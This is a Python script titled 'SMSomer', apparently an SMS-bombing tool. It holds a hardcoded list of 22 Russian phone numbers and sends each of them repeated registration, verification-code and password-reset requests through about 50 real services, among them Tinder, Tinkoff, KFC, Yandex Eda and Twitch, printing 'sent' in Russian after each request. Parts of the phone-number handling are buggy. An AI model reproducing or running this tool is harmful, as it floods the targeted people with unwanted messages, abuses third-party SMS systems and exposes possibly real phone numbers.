import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

banner = """
 ____________________________________________________
|                                                    |
| [--] Name: SMSomer                                 |
|                                                    |
| [--] Have Services: 51                             |
|                                                    |
| [--] Version: 1.0.6                                |
|____________________________________________________|
"""

print(banner)
_phone = ['79510006255','79147194077','79841505820','79677543694','79940126087','79841461606','79025246745','79532112364',
          '79644493025','79147298968','79149626665','79149737742','79243399223','79662744517','79149784708',
          '79143227561','79146864725','79242454191','79644471504','79520840008','79146691936','79662871237']
for index in range(20):
    if _phone[index][0] == '+':
        _phone = _phone[index][1:]
    if _phone[index][0] == '8':
        _phone = '7' + _phone[index][1:]
    if _phone[index][0] == '9':
        _phone = '7' + _phone

    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[index][1:]
    _phoneAresBank = '+' + _phone[index][0] + '(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + _phone[index][7:9] + '-' + _phone[index][9:11]
    _phone9dostavista = _phone9[index][:3] + '+' + _phone9[index][3:6] + '-' + _phone9[index][6:8] + '-' + _phone9[index][8:10]
    _phoneOstin = '+' + _phone[index][0] + '+(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + _phone[index][7:9] + '-' + _phone[index][9:11]
    _phonePizzahut = '+' + _phone[index][0] + ' (' + _phone[index][1:4] + ') ' + _phone[index][4:7] + ' ' + _phone[index][7:9] + ' ' + _phone[index][9:11]
    _phoneGorzdrav = _phone[index][1:4] + ') ' + _phone[index][4:7] + '-' + _phone[index][7:9] + '-' + _phone[index][9:11]

    print(_phone[index])
    for iteration in range(2):
        _email = _name[index] + f'{iteration}' + '@gmail.com'
        email = _name[index] + f'{iteration}' + '@gmail.com'
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone[index], 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9[index]}).json()["res"]
            print('[+] RuTaxi отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone[index]}, headers={})
            print('[+] BelkaCar отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone[index]}, headers={})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]}, headers={})
            print('[+] Karusel отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone[index]}, headers={})
            print('[+] Tinkoff отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone[index]}, headers={})
            print('[+] MTS отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut[index], '_token': '*'})
            print('[+] PizzaHut отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone[index]})
            print('[+] Rabota отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone[index]})
            print('[+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
            print('[+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name[index], 'phone': _phone[index], 'promo': 'yellowforma'})
            print('[+] Smsint отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9[index] + '&country_code=%2B7&nod=4&locale=en')
            print('[+] oyorooms отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                          params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                                  'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                          data={'phone': _phone[index], 'g-recaptcha-response': '', 'recaptcha': 'on'})
            print('[+] MVideo отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone[index], 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[+] newnext отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone[index]})
            print('[+] Sunlight отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email[index], 'mobile_phone': _phone[index],
                                'deliveryOption': 'sms'})
            print('[+] alpari отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone[index]})
            print('[+] Invitro отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone[index]}, 'id': '1'})
            print('[+] Sberbank отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                          json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                'birthDate': '10.10.2000', 'mobilePhone': _phone9[index], 'russianFederationResident': 'true',
                                'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                                'promotionAgreement': 'true'})
            print('[+] Psbank отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone[index]})
            print('[+] Beltelcom отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]})
            print('[+] Karusel отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone[index]})
            print('[+] KFC отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone[index]},
                                                             "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[+] carsmile отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
            print('[+] Citilink отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone[index], "SignupForm[device_type]": 3})
            print('[+] Delitime отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone[index]})
            print('[+] findclone звонок отправлен!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone[index]}})
            print('[+] Guru отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone[index], "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[+] ICQ отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone[index], "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            print('[+] InDriver отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password[index], "application": "lkp", "login": "+" + _phone[index]})
            print('[+] Invitro отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone[index]})
            print('[+] Pmsm отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone[index]})
            print('[+] IVI отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone[index], "api": 2, "email": "email", "x-email": "x-email"})
            print('[+] Mail.ru отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone[index], "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[+] MVideo отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone[index]})
            print('[+] OK отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/', json={"phone": _phone[index]})
            print('[+] Plink отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone[index]})
            print('[+] qlean отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone[index]})
            print('[+] SMSgorod отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone[index]})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone[index], "username": username[index]})
            print('[+] Twitch отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone[index]},
                          headers={'App-ID': 'cabinet'})
            print('[+] CabWiFi отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone[index], "type": 2})
            print('[+] wowworks отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone[index]})
            print('[+] Eda.Yandex отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone[index],
                                "deliveryOption": "sms"})
            print('[+] Alpari отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone[index]})
            print('[+] SMS отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone[index]})
            print('[+] Delivery отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            iteration += 1
            print(('{} круг пройден.').format(iteration))
        except:
            break